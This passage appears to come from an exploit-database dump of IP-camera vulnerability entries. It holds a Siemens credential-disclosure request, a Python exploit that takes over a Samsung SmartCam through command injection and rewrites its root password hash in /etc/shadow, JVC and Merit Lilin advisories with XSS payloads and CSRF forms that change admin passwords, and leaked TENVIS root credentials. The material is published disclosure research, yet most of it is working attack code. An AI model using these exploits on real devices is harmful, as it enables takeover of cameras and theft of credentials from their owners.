SIEMENS IP-Camera (CVMS2025-IR + CCMS2025) allows to unauthenticated user disclose the username & password remotely by simple request which made by browser.
4. Proof-of-Concept:
Simply go to the following url:
Should return some javascript variable which contain the credentials and other configuration vars:
var Adm_ID=""admin""; var Adm_Pass1=“admin”; var Adm_Pass2=“admin”; var Language=“en”; var Logoff_Time=""0"";
Request:
GET /cgi-bin/readfile.cgi?query=ADMINID HTTP/1.1
Host: host:port
Connection: close
Response:
HTTP/1.0 200 OK
Connection: close
Content-type: text/html
var Adm_ID=""admin"";
var Adm_Pass1=“admin”;
var Adm_Pass2=“admin”;
var Language=“en”;
var Logoff_Time=""0"";
Login @ http://host:port/cgi-bin/chklogin.cgi
5. SOLUTION
Contact the vendor for further information regarding the proper mitigation of this vulnerability."
2016-08-14,Remote,Hardware,PentestPartners,Samsung Smart Home Camera SNH-P-6410,Command Injection,"# E-DB Note: source ~ https://www.pentestpartners.com/blog/samsungs-smart-camera-a-tale-of-iot-network-security/
# New password for web interface
# New password for root
# IP of the camera
# These are all for the Smartthings bundled camera
# Take a command and use command injection to run it on the device
# Convert a normal command into one using bash brace expansion
# Can't send spaces to debugcgi as it doesn't unescape
# HTTP digest auth for urllib2
# Step 1 - change the web password using the unauthed vuln found by zenofex
# Need to sleep or the password isn't changed
# Step 2 - find the current root password hash
# Crypt the new password
# Step 3 - Use sed to search and replace the old for new hash in the passwd
# This is done because the command injection doesn't allow a lot of different URL encoded chars
# Step 4 - check that the password has changed
# Step 5 - ssh to port 1022 with new root password!","import urllib, urllib2, crypt, time
web_password  = 'admin'
root_password= 'root'
ip       = '192.168.12.61'
realm = 'iPolis'
web_username = 'admin'
base_url = 'http://' + ip + '/cgi-bin/adv/debugcgi?msubmenu=shell&command=ls&command_arg=/...;'
def run_command(command):
command_brace = '{' + ','.join(command.split(' ')) + '}'
command_url = base_url + command_brace
authhandler = urllib2.HTTPDigestAuthHandler()
authhandler.add_password(realm, command_url, web_username, web_password)
opener = urllib2.build_opener(authhandler)
urllib2.install_opener(opener)
return urllib2.urlopen(command_url)
data = urllib.urlencode({ 'data' : 'NEW;' + web_password })
urllib2.urlopen('http://' + ip + '/classes/class_admin_privatekey.php', data)
time.sleep(1)
shadow = run_command('cat /etc/shadow')
for line in shadow:
if line.startswith('root:'):
current_hash = line.split(':')[1]
new_hash = crypt.crypt(root_password, '00')
run_command('sed -i -e s/' + current_hash + '/' + new_hash + '/g /etc/shadow')
shadow = run_command('cat /etc/shadow')
for line in shadow:
if line.startswith('root:'):
current_hash = line.split(':')[1]
if current_hash <> new_hash:
print 'Error! - password not changed'"
2016-05-10,WebApps,Hardware,Orwelllabs,JVC HDRs / Net (Multiple Cameras),Multiple Vulnerabilities,"www.orwelllabs.com
http://www.orwelllabs.com/2016/04/jvc-multiple-products-multiple.html
http://xxx.xxx.xxx.xxx/api/param?video.input(01).comment&video.input(02).comment&video.input(03).comment&video.input(04).comment&video.input(05).comment&video.input(06).comment&video.input(07).comment&video.input(08).comment&video.input(09).comment
http://xxx.xxx.xxx.xxx/api/param?network.interface(01).dhcp.status[ *** XSS
http://xxx.xxx.xxx.xxx/api/param?video.input(01).comment<img src=a","| | |       |
_ \  _|\ \  \ / -_) | | |  _` |  _ \(_-<
\___/_|   \_/\_/\___|_|_|_|\__,_|_.__/___/
security advisory
olsa-2016-04-01
* Adivisory Information
(+) Title: JVC Multiple Products Multiple Vulnerabilities
(+) Vendor: JVC Professional Video
(+) Research and Advisory: Orwelllabs
(+) Adivisory URL:
(+) OLSA-ID: OLSA-2016-04-01
(+) Affected Products: JVC HDR VR-809/816, Network cameras VN-C*, VN-V*,
VN-X* with firmwares 1.03 and 2.03
(+) IoT Attack Surface: Device Administrative Interface
(+) Owasp IoTTop10: I1, I2
* Overview
I1 - 1. Multiple Cross-site Scripting
I1 - 2. HTTP Header Injection
I1 - 3. Multiple Cross-site Request Forgery
I1 - 4. Cleartext sensitive data
I1 - 5. Weak Default Credentials/Known credentials
I2 - 6. Poorly Protected Credentials
1. Reflected Cross-site scripting
JVC Hard Disk Recorders are prone to XSS and HTTP Header Injection[2].
(+) Affected Products:
JVC VR-809 HDR
JVC VR-816 HDR
(+) Technical Details/PoCs
(+) URL Trigger:
(+) Payload used [ *** XSS *** ]: <img src=a onerror=alert(""0rwelll4bs"")>
(+) affected script/path: /api/param?
(+) affected parameters (video.input.COMMENT):
+ video.input(01).comment[ *** XSS *** ]
+ video.input(02).comment[ *** XSS *** ]
+ video.input(03).comment[ *** XSS *** ]
+ video.input(04).comment[ *** XSS *** ]
+ video.input(05).comment[ *** XSS *** ]
+ video.input(06).comment[ *** XSS *** ]
+ video.input(07).comment[ *** XSS *** ]
+ video.input(08).comment[ *** XSS *** ]
+ video.input(09).comment[ *** XSS *** ]
(+) affected parameters (video.input.STATUS):
+ video.input(01).status[ *** XSS *** ]
+ video.input(02).status[ *** XSS *** ]
+ video.input(03).status[ *** XSS *** ]
+ video.input(04).status[ *** XSS *** ]
+ video.input(05).status[ *** XSS *** ]
+ video.input(06).status[ *** XSS *** ]
+ video.input(07).status[ *** XSS *** ]
+ video.input(08).status[ *** XSS *** ]
+ video.input(09).status[ *** XSS *** ]
(+) URL Trigger:
(+) affected parameters:
+ interface(01).dhcp.status[ *** XSS *** ]
* In fact the javascript can be triggered just requesting the '/api/param?'
directly with payload, like this:
(+) URL: http://xxx.xxx.xxx.xxx/api/param?[*** XSS *** ]
2. HTTP Header Injection
The value of the ""video.input(X).comment/status"" request parameter is
copied into the 'X-Response' response header.
So the malicious payload submitted in the parameter generates a response
with an injected HTTP header.
> If you request the following URL with an Javascript Payload ""[*** XSS
onerror=alert(""XSS"")>&video.input(02).comment&video.input(03).comment&video.input(04).comment&video.input(05).comment&video.input(06).comment&video.input(07).comment&video.input(08).comment&video.input(09).comment
> It will gennerate the GET request bellow:
GET /api/param?video.input(01).comment<img src=a
onerror=alert(""XSS"")>&video.input(02).comment&video.input(03).comment&video.input(04).comment&video.input(05).comment&video.input(06).comment&video.input(07).comment&video.input(08).comment&video.input(09).comment
HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101
Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://xxx.xxx.xxx.xxx/
Cookie: vrtypename=Hard%20Disk%20Recorder; vrmodelname=0rw3|||4bs
Authorization: Basic YWRtaW46anZj
Connection: keep-alive
> And we'll get the response from the server:
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 564
X-Response: video.input(01).comment<img src=a
onerror=alert(""XSS"")>&video.input(02).comment&video.input(03).comment&video.input(04).comment&video.input(05).comment&video.input(06).comment&video.input(07).comment&video.input(08).comment&video.input(09).comment
Cache-control: no-cache
Pragma: no-cache
Expires: Thu, 05 May 2016 14:20:45 GMT
Server: JVC VR-809/816 API Server/1.0.0
Date: Thu, 05 May 2016 14:20:45 GMT
The javascript payload will be inject in X-Response response Header field
3. Multiple Cross-site Request Forgery
Multiple products from JVC are prone to CSRF.
(+) Affected Products:
The following products with firmware versions 1.03, 2.03 and early:
VN-C2WU
VN-C3U
VN-C1U
VN-C2U
VN-C3WU
VN-A1U
VN-C10U
VN-C11U
VN-C655U
VN-C625U
VN-C205U
VN-C215V4U
VN-C215VP4U
VN-V686U
VN-V686WPU
VN-V25U
VN-V26U
VN-X35U
VN-V685U
VN-V686WPBU
VN-X235VPU
VN-V225VPU
VN-X235U
VN-V225U
VN-V17U
VN-V217U
VN-V217VPU
VN-H157WPU
VN-T16U
VN-T216VPRU
(+) Technical Details/PoCs
> CSRF: to change 'admin' password to 'sm!thW'
<html>
<!-- Orwelllabs - JVC NetCams CSRF PoC -->
<body>
<form action=""http://xxx.xxx.xxx.xxx/cgi-bin/c20setup.cgi""
method=""POST"">
<input type=""hidden"" name=""c20loadhtml""
value=""c20systempassword&#46;html"" />
<input type=""hidden"" name=""usermode"" value=""admin"" />
<input type=""hidden"" name=""newpassword"" value=""sm!thW"" />
<input type=""hidden"" name=""new2password"" value=""sm!thW"" />
<input type=""hidden"" name=""ok"" value=""OK"" />
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>
> CSRF: to set 'user' password to ""w!nst0nSm!th""
<html>
<!-- Orwelllabs - JVC NetCams CSRF PoC -->
<body>
<form action=""http://xxx.xxx.xxx.xxx/cgi-bin/c20setup.cgi""
method=""POST"">
<input type=""hidden"" name=""c20loadhtml""
value=""c20systempassword&#46;html"" />
<input type=""hidden"" name=""usermode"" value=""user"" />
<input type=""hidden"" name=""newpassword"" value=""w!nst0nSm!th"" />
<input type=""hidden"" name=""new2password"" value=""w!nst0nSm!th"" />
<input type=""hidden"" name=""ok"" value=""OK"" />
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>
> CSRF: to reinitialize the cam
<html>
<!-- Orwelllabs - JVC NetCams CSRF PoC -->
<body>
<form action=""http://xxx.xxx.xxx.xxx/cgi-bin/c20setup.cgi""
method=""POST"">
<input type=""hidden"" name=""c20loadhtml""
value=""c20systemmainte&#46;html"" />
<input type=""hidden"" name=""init"" value=""Initialize"" />
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>
4. Cleartext sensitive data
By default everything is trasmite over HTTP, including credentials.
5. Weak Default Credentials/Known credentials
The vast maiority of these devices remain with default credential admin:jvc
or admin:[model-of-camera] and costumers are not obligated to change it
during initial setup.
6. Poorly Protected Credentials
An attacker in the same network is able to capture and decode the
credentials as they aren't trasmited over HTTPs and are protected using
just
Base64 with Basic Authorization.
> Authentication process
GET /cgi-bin/x35viewing.cgi?x35ptzviewer.html HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101
Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: X35JPEGVIEWSIZE=VGA; X35JPEGDISP=OFF-OFF-OFF-OFF-1;
X35JPEGSTREAM=HTTP-5-225.0.1.1-49152; X35JPEGHTTPPORT=80;
X35FOLDERNAME=VN-X35; X35MPEG4VIEWSIZE=VGA; X35MPEG4DISP=OFF-OFF-OFF-1;
X35MPEG4STREAM=HTTP-225.0.2.1-59152; X35MPEG4HTTPPORT=80;
X35AUDIO=OFF-HTTP-225.0.3.1-39152-49298-80; X35PTZCTRL=w!nst0nSm!th
Connection: keep-alive
Authorization: Basic YWRtaW46anZj
*Once this is related with a old bad design is possible that a large range
of products are affected by reported issues.
Timeline
2016-04-20: First attemp to contact Vendor
2016-04-22: Vendor asks for products affected/details sent
2016-04-26: Ask vendor for any news about the issues reported
2016-05-09: Until this date no response
2016-05-10: Full disclosure
Legal Notices
The information contained within this advisory and in any other published
by our lab is supplied ""as-is"" with no warranties or guarantees of fitness
of use or otherwise.
I accept no responsibility for any damage caused by the use or misuse of
this information.
About Orwelllabs
Orwelllabs is an independent security research lab interested in IoT, what
means embedded devices and all its components like web applications,
network, mobile applications and all surface areas prone to attack.
Orwelllabs aims to study, learn and produce some intelligence around this
vast and confusing big picture called smart cities. We have special
appreciation for devices designed to provide security to these highly
technological cities, also known as Iost (Internet of Security Things ).
-----BEGIN PGP PUBLIC KEY BLOCK-----
mQENBFcJl8wBCAC/J8rAQdOoC82gik6LVbH674HnxAAQ6rBdELkyR2S2g1zMIAFt
xNN//A3bUWwFtlrfgiJkiOC86FimPus5O/c4iZc8klm07hxWuzoLPzBPM50+uGKH
xZwwLa5PLuuR1T0O+OFqd9sdltz6djaYrFsdq6DZHVrp31P7LqHHRVwN8vzqWmSf
55hDGNTrjbnmfuAgQDrjA6FA2i6AWSTXEuDd5NjCN8jCorCczDeLXTY5HuJDb2GY
U9H5kjbgX/n3/UvQpUOEQ5JgW1QoqidP8ZwsMcK5pCtr9Ocm+MWEN2tuRcQq3y5I
SRuBk/FPhVVnx5ZrLveClCgefYdqqHi9owUTABEBAAG0IU9yd2VsbExhYnMgPG9y
d2VsbGxhYnNAZ21haWwuY29tPokBOQQTAQgAIwUCVwmXzAIbAwcLCQgHAwIBBhUI
AgkKCwQWAgMBAh4BAheAAAoJELs081R5pszAhGoIALxa6tCCUoQeksHfR5ixEHhA
Zrx+i3ZopI2ZqQyxKwbnqXP87lagjSaZUk4/NkB/rWMe5ed4bHLROf0PAOYAQstE
f5Nx2tjK7uKOw+SrnnFP08MGBQqJDu8rFmfjBsX2nIo2BgowfFC5XfDl+41cMy9n
pVVK9qHDp9aBSd3gMc90nalSQTI/QwZ6ywvg+5/mG2iidSsePlfg5d+BzQoc6SpW
LUTJY0RBS0Gsg88XihT58wnX3KhucxVx9RnhainuhH23tPdfPkuEDQqEM/hTVlmN
95rV1waD4+86IWG3Zvx79kbBnctD/e9KGvaeB47mvNPJ3L3r1/tT3AQE+Vv1q965
AQ0EVwmXzAEIAKgsUvquy3q8gZ6/t6J+VR7ed8QxZ7z7LauHvqajpipFV83PnVWf
ulaAIazUyy1XWn80bVnQ227fOJj5VqscfnHqBvXnYNjGLCNMRix5kjD/gJ/0pm0U
gqcrowSUFSJNTGk5b7Axdpz4ZyZFzXc33R4Wvkg/SAvLleU40S2wayCX+QpwxlMm
tnBExzgetRyNN5XENATfr87CSuAaS/CGfpV5reSoX1uOkALaQjjM2ADkuUWDp6KK
6L90h8vFLUCs+++ITWU9TA1FZxqTl6n/OnyC0ufUmvI4hIuQV3nxwFnBj1Q/sxHc
TbVSFcGqz2U8W9ka3sFuTQrkPIycfoOAbg0AEQEAAYkBHwQYAQgACQUCVwmXzAIb
DAAKCRC7NPNUeabMwLE8B/91F99flUVEpHdvy632H6lt2WTrtPl4ELUy04jsKC30
MDnsfEjXDYMk1GCqmXwJnztwEnTP17YO8N7/EY4xTgpQxUwjlpah++51JfXO58Sf
Os5lBcar8e82m1u7NaCN2EKGNEaNC1EbgUw78ylHU3B0Bb/frKQCEd60/Bkv0h4q
FoPujMQr0anKWJCz5NILOShdeOWXIjBWxikhXFOUgsUBYgJjCh2b9SqwQ2UXjFsU
I0gn7SsgP0uDV7spWv/ef90JYPpAQ4/tEK6ew8yYTJ/omudsGLt4vl565ArKcGwB
C0O2PBppCrHnjzck1xxVdHZFyIgWiiAmRyV83CiOfg37
=IZYl
-----END PGP PUBLIC KEY BLOCK-----"
2016-04-29,WebApps,CGI,Orwelllabs,Merit Lilin IP Cameras,Multiple Vulnerabilities,"www.orwelllabs.com
http://www.orwelllabs.com/2016/04/merit-lilin-ip-cameras-multiple_27.html
# Basic >> System >> User
http://xxx.xxx.xxx.xxx/apply2.cgi?action=useredit&user_seq=1&user_account=admin&user_password=w!nst0nSm!th&user_priority=254&user_group=0
# Basic >> Network >> DDNS
http://xxx.xxx.xxx.xxx/apply.cgi?action=ddns_apply&next_page=ddns.asp&ddns_type=0&ddns_flag=1&ddns_account=Winston&ddns_pwd=pass&ddns_hostname=smithwmachine&ddns_new_pwd=&ddns_wanip=
# SNMP
http://xxx.xxx.xxx.xxx/snmp?snmpenable=0&v12rwcommunity=public&v12rocommunity=private&v3user=admin&v3authpass=password&v3pripass=w!nst0nSm!th&v3rwuser=public&v3rouser=private
# Basic >> Network >> SIP
http://xxx.xxx.xxx.xxx/apply.cgi?action=sip_apply&next_page=sip.asp&voip_flag=1&sip_domain_server=lilintw.ddnsipcam.com&sipreg_username=admin&sipreg_password=pass&sipreg_expires=0&sip_port=5060&audiortp_port=7078&videortp_port=9078
http://xxx.xxx.xxx.xxx/apply.cgi?action=httppost_apply&next_page=httppost.asp&HTTPServer=192.168.0.2&HTTPPostPort=56082&HTTPAccount=LILIN&HTTPPassword=control4&AM_HTTP_JPEG=[
//Profileno,Width,Height,Type,ScreenSwitch,Resolution,Cmd
//http://192.168.3.162/sdlist?dirlist=0
//http://192.168.3.225/sdlist?filelist=2012081001
//var g_AllDir =
//var g_AllFiles =","_   _   _   _   _   _   _   _   _   _
/ \ / \ / \ / \ / \ / \ / \ / \ / \ / \
( 0 | R | W | 3 | L | L | L | 4 | 8 | 5 )
\_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/
securityadivisory
@orwelllabs
;)(r
By sitting in the alcove, and keeping well back,
Winston was able to remain outside the range of the telescreen...
* Adivisory Information
(+) Title: Merit Lilin IP Cameras Multiple Vulnerabilities
(+) Vendor: Merit Lilin Enterprise Co., Ltd.
(+) Research and Advisory: Orwelllabs
(+) Adivisory URL:
(+) OLSA-ID: OLSA-2016-04-28
(+) Affected Versions: L series products with firmware 1.4.36/1.2.02, OS
Version: Linux 2.6.38/Linux 2.6.32
(+) IoT Attack Surface: Device Administrative
Interface/Authentication/Authorization
(+) Owasp IoTTop10: I1, I2
* Adivisory Overview
id|         Vulnerability Title               | Rank |      Attack Surface
1 | Multiple Cross-site Request Forgery |  I1  | Insecure Web Interfaces
2 | Multiple Cross-site Scripting/HTML Injection|  I1  | Insecure Web
Interfaces
3 | Hard-coded credentials   |  I1  | Insecure Web Interfaces
4 | Cleartext sensitive data   |  I1  | Insecure Web Interfaces
5 | Weak Passwords/Known credentials       |  I1  | Insecure Web Interfaces
6 | Account lockout   |  I1  | Insecure Web Interfaces
7 | Poorly Protected Credentials     |  I2  | Insufficient
Authentication/Authorization
Vendor Background
LILIN, is a global IP video manufacturer of IP video cameras, recording
devices, and software with over 30 years of experience.
1. Multiple Cross-site Request Forgery
Merit LILIN IP Cameras are prone to multiple cross-site request forgery
vulnerabilities.
(+) Technical Details and PoCs:
> Changing 'admin' password to 'w!nst0nSm!th'
<html>
<!-- Orwelllabs - Merit Lilin IP Camera - CSRF PoC -->
<body>
<form action=""
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>
> change DDNS information (user/hostname/password)
<html>
<!-- Orwelllabs - Merit Lilin IP Camera - CSRF PoC -->
<body>
<form action=""
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>
> change community/user/pass/pripass/v3rouser/etc.
<html>
<!-- Orwelllabs - Merit Lilin IP Camera - CSRF PoC -->
<body>
<form action=""
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>
> change sip_domain_server/sipreg_username/sipreg_password/sip_port=/etc.
<html>
<!-- Orwelllabs - Merit Lilin IP Camera - CSRF PoC -->
<body>
<form action=""
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>
2. Multiple Cross-site Scripting/HTML Injection
Merit Lilin IP Cameras are prone to multiple cross-site scripting
vulnerabilities.
Technical Details and PoCs:
[SAMBA] Advance >> System >> SAMBA Service
%- Script: apply.cgi
%- affected parameters:
(+) action
(+) SambaRecordState
(+) SAMBA_OSD
(+) SAMBARecordOption2
(+) SAMBARecordFormat
(+) SAMBAPreRecordTime
(+) SAMBAServer
(+) SAMBAServerPort
(+) SAMBAServerAccount
(+) SAMBAServerPassword
(+) SAMBAServerDirectory
%- [ *** XSS *** ] Payload(1) used:
123%3Cimg%20src=%22x%20%22%20onerror=prompt%28%22Lilin_Password:%22%29%20/%3E
%- URL: http://xxx.xxx.xxx.xxx/apply.cgi?action=[ *** XSS ***
]&SambaRecordState=[ *** XSS *** ]&SAMBA_OSD=[ *** XSS ***
]&SAMBARecordOption2=[ *** XSS *** ]&SAMBARecordFormat=[ *** XSS ***
]&SAMBAPreRecordTime=[ *** XSS *** ]&SAMBAServer=[ *** XSS ***
]&SAMBAServerPort=[ *** XSS *** ]&SAMBAServerAccount=[ *** XSS ***
]&SAMBAServerPassword=[ *** XSS *** ]&SAMBAServerDirectory=[ *** XSS *** ]
[General] -> Basic >> System >> General
- Affected script: apply.cgi
- affected parameters:
(+) action
(+) next_page
(+) SAMBAServerDirectory
%- [ *** XSS *** ] Payload(2) used:
%22%3E%3Cscript%3Ealert%281%29%3C/script%3E
%- URL http://xxx.xxx.xxx.xxx/apply.cgi?action=[ *** XSS *** ]&next_page=[
*** XSS ***
]&CAM_NAME=LR6122&ACTIVEX_OSD_NAME=LR6122&CAM_OSD=0&TIMER_OSD=0&ACTIVEX_OSD_ENABLE=0&ACTIVEX_MODE=0
[HTTP POST Service] -> Advance >> Event >> HTTP POST Service
- Affected script: apply.cgi
- affected parameters:
(+) AM_HTTP_JPEG
(+) next_page*-*
(+) HTTPPostPort*-*
%- [ *** XSS *** ] Payload used:
123%3Cimg%20src=%22x%20%22%20onerror=prompt%28%22Lilin_Password:%22%29%20/%3E
*-* Payload(2)
%- URL:
*** XSS *** ]
3. Hard-coded credentials
This application stores hard-coded credentials in html code.
Technical Details and PoCs:
(+) GET -> http://xxx.xxx.xxx.xxx/new/index.htm
HTML Source code:
<script>
var g_ScreenMode = GetCookie('ScreenMode');
if(g_ScreenMode==null || g_ScreenMode=='' || g_ScreenMode==' ')
g_ScreenMode = 1;
SetCookie('ScreenMode', 1);
var g_AD_OSD_FLAG = GV('0','0');
var g_CtrlInfo = new Ctrl_ProfileInfo('',0,0,'',g_ScreenMode,'','');
var g_AD_RATE = Number('0');
var g_video_port = Number('0');
var g_spook_port = Number('554');
var g_httpd_auth_account = 'admin'; <<<<<---- user
var g_httpd_auth_passwd  = 'pass'; <<<<<---- pass
var g_encode_mode = Number('0');
var g_profile00_fps_dwell = 1000/Number('15');
var g_profile01_fps_dwell = 1000/Number('5');
var g_profile02_fps_dwell = 1000/Number('25');
var g_profile03_fps_dwell = 1000/Number('0');
var g_ACTIVEX_OSD_ENABLE = Number('0');
var g_title_name = 'LR6122';
var g_CAM_OSD = Number('0');
var g_TIMER_OSD = Number('0');
[... Snip ...]
(+) GET -> http://xxx.xxx.xxx.xxx/new/no_sd_file.htm
HTML source code:
[... Snip ...]
""2012080901,2012080902,2012080903,2012080904,2012080905,2012080906:2012081001,2012081002:2012081101,2012081111"";
""20120809010124.avi,20120809010234.avi,20120809010334.avi,20120809010434.avi,20120809010534.avi,20120809010643.avi"";
var g_httpd_auth_account = GV('admin','admin'); <<<<<---- here
var g_httpd_auth_passwd = GV('pass','pass');     <<<<<---- here
[... Snip ...]
4. Cleartext sensitive data
Everything is trasmite over HTTP, including credentials,
like this, when an administrador ""submmit"" the Samba configuration form
(cleartext everywhere).
Technical Details and PoCs:
GET
/apply.cgi?action=sambarec_apply&SambaRecordState=0&SAMBA_OSD=0&SAMBARecordOption2=0&SAMBARecordFormat=0&SAMBAPreRecordTime=5&SAMBAServer=192.168.0.100&SAMBAServerPort=5000&SAMBAServerAccount=admin&SAMBAServerPassword=pass&SAMBAServerDirectory=/Public
HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101
Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46cGFzcw==
Connection: keep-alive
5. Weak Default Credentials/Known credentials
The vast maiority of these devices remain with default credential
admin:pass (cameras)/admin:1111 (NVR) and costumers are not obligated to
change it during initial setup. The best
6. Account Lockout
There is no control to prevent brute force attacks and to lockout an
account after X failed login attempts.
I1.Impact
Insecure web interfaces can result in data loss or corruption, lack of
accountability, or denial of access and can lead to complete device
takeover.
7. Poorly Protected Credentials
An attacker in the same network is able to capture and decode the
credentials as they aren't trasmited over HTTPs and are protected using
just Base64 encoding.
Technical Details and PoCs:
> GET Request of) Authentication Process
GET /new/setup.htm HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101
Firefox/45.0
Accept: O|orwell/labs,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://xxx.xxx.xxx.xxx/new/setup.htm
Cookie: lang=0; ScreenMode=O-Orw3lll@bs; profileno=0; uimode=1
Connection: keep-alive
Authorization: Basic YWRtaW46cGFzcw==
Affected products
L series with firmware 1.4.36/1.2.02, OS Version: Linux 2.6.38/Linux 2.6.32.
LB1022X
LR7224X
LR7228X
LR7424X
LR7428X
LR7722X
LR7022
LR7922
LR6122X
LR6022X
LR2322X
LR2122
LR312
LR832
LR2522
LD6122X
LD2322X
LD2122
LD2222
*Once this is related with a old bad design its probably that a large range
of products are affected by reported issues.
Timeline
2016-03-23: First attemp to contact Vendor
2016-04-22: Request #13617 ""Lilin Products Vulnerabilities"" created
2016-04-23: Attemp to contact vendor
2016-04-25: Vendor response (ask for details)
2016-04-27: According to the Vendor these issues are already know and will
be remediated in the future.
2016-04-28: Full disclosure
About Orwelllabs
Orwelllabs is an independent security research lab interested in IoT, what
means embedded devices and all its components like web applications, network,
mobile applications and all surface areas prone to attack. Orwelllabs aims
to study, learn and produce some intelligence around this vast and
confusing big picture called smart cities. We have special appreciation for
devices designed to provide security to these highly technological cities,
also known as Iost (Internet of Things Security).
-----BEGIN PGP PUBLIC KEY BLOCK-----
mQENBFcJl8wBCAC/J8rAQdOoC82gik6LVbH674HnxAAQ6rBdELkyR2S2g1zMIAFt
xNN//A3bUWwFtlrfgiJkiOC86FimPus5O/c4iZc8klm07hxWuzoLPzBPM50+uGKH
xZwwLa5PLuuR1T0O+OFqd9sdltz6djaYrFsdq6DZHVrp31P7LqHHRVwN8vzqWmSf
55hDGNTrjbnmfuAgQDrjA6FA2i6AWSTXEuDd5NjCN8jCorCczDeLXTY5HuJDb2GY
U9H5kjbgX/n3/UvQpUOEQ5JgW1QoqidP8ZwsMcK5pCtr9Ocm+MWEN2tuRcQq3y5I
SRuBk/FPhVVnx5ZrLveClCgefYdqqHi9owUTABEBAAG0IU9yd2VsbExhYnMgPG9y
d2VsbGxhYnNAZ21haWwuY29tPokBOQQTAQgAIwUCVwmXzAIbAwcLCQgHAwIBBhUI
AgkKCwQWAgMBAh4BAheAAAoJELs081R5pszAhGoIALxa6tCCUoQeksHfR5ixEHhA
Zrx+i3ZopI2ZqQyxKwbnqXP87lagjSaZUk4/NkB/rWMe5ed4bHLROf0PAOYAQstE
f5Nx2tjK7uKOw+SrnnFP08MGBQqJDu8rFmfjBsX2nIo2BgowfFC5XfDl+41cMy9n
pVVK9qHDp9aBSd3gMc90nalSQTI/QwZ6ywvg+5/mG2iidSsePlfg5d+BzQoc6SpW
LUTJY0RBS0Gsg88XihT58wnX3KhucxVx9RnhainuhH23tPdfPkuEDQqEM/hTVlmN
95rV1waD4+86IWG3Zvx79kbBnctD/e9KGvaeB47mvNPJ3L3r1/tT3AQE+Vv1q965
AQ0EVwmXzAEIAKgsUvquy3q8gZ6/t6J+VR7ed8QxZ7z7LauHvqajpipFV83PnVWf
ulaAIazUyy1XWn80bVnQ227fOJj5VqscfnHqBvXnYNjGLCNMRix5kjD/gJ/0pm0U
gqcrowSUFSJNTGk5b7Axdpz4ZyZFzXc33R4Wvkg/SAvLleU40S2wayCX+QpwxlMm
tnBExzgetRyNN5XENATfr87CSuAaS/CGfpV5reSoX1uOkALaQjjM2ADkuUWDp6KK
6L90h8vFLUCs+++ITWU9TA1FZxqTl6n/OnyC0ufUmvI4hIuQV3nxwFnBj1Q/sxHc
TbVSFcGqz2U8W9ka3sFuTQrkPIycfoOAbg0AEQEAAYkBHwQYAQgACQUCVwmXzAIb
DAAKCRC7NPNUeabMwLE8B/91F99flUVEpHdvy632H6lt2WTrtPl4ELUy04jsKC30
MDnsfEjXDYMk1GCqmXwJnztwEnTP17YO8N7/EY4xTgpQxUwjlpah++51JfXO58Sf
Os5lBcar8e82m1u7NaCN2EKGNEaNC1EbgUw78ylHU3B0Bb/frKQCEd60/Bkv0h4q
FoPujMQr0anKWJCz5NILOShdeOWXIjBWxikhXFOUgsUBYgJjCh2b9SqwQ2UXjFsU
I0gn7SsgP0uDV7spWv/ef90JYPpAQ4/tEK6ew8yYTJ/omudsGLt4vl565ArKcGwB
C0O2PBppCrHnjzck1xxVdHZFyIgWiiAmRyV83CiOfg37
=IZYl
-----END PGP PUBLIC KEY BLOCK-----"
2016-04-18,DoS,Hardware,DLY,TH692 Outdoor P2P HD Waterproof IP Camera,Hard-Coded Credentials,,"Exploit Title: TH692- Outdoor P2P HD Waterproof IP Camera hardcoded credentials
Date: 4/16/2016
Exploit Author: DLY
Vendor: TENVIS Technology Co., Ltd
Product: TH692- Outdoor P2P HD Waterproof IP Camera
Product webpage: http://www.tenvis.com/th-692-outdoor-p2p-hd-waterproof-ip-camera-p-230.html
Affected version: TH692C-V. 16.1.16.1.1.4
firmware download link: http://download.tenvis.com/files/updatefiles/UPG_ipc3360a-w7-M20-hi3518-20160229_173554.ov
user: Mroot
pass:cat1029
user:Wproot
pass: cat1029
root@kali:~# strings UPG_ipc3360a-w7-M20-hi3518-20160229_173554.ov.1 | grep root
rootpath
rootfs crc %lx
------------------start upgrade rootfs------------------
------------------end upgrade rootfs------------------
bootargs=mem=74M console=ttyAMA0,115200 root=/dev/mtdblock2 rootfstype=jffs2 mtdparts=hi_sfc:256K(boot),2560K(kernel),11520K(rootfs),1M(config),64K(key),960K(ext)
nfsroot
7root
Bmount -t nfs -o nolock 192.168.0.99:/home/bt/vvvipc_develop/rootfs_target /nfsroot
k01000100    rootbox    nohelp info
root::0:
Mroot:$1$xFoO/s3I$zRQPwLG2yX1biU31a2wxN/:0:0::/root:/bin/sh
Wproot:$1$d3VPdE0x$Ztn09cyReJy5PynZgwCbw0:0:0::/root:/bin/sh
nfsroot
pivot_root
